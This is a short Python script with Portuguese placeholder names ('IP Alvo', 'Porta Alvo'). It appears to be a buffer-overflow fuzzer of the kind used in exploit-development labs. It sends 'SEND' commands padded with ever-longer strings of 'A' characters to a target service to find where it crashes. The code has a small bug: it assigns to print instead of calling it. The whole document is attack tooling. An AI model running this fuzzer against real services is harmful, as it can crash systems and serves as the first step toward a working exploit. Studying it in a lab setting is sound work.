import socket

lista =["A"]
contador = 100

while len(lista) <= 50:
    lista.append("A"*contador)
    contador = contador + 100

for dados in lista:
    print = "Fuzzing SEND %s bytes" %len(dados)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("IP Alvo", "Porta Alvo" ))
    s.recv(1024)
    s.send("SEND "+dados+"\r\n")
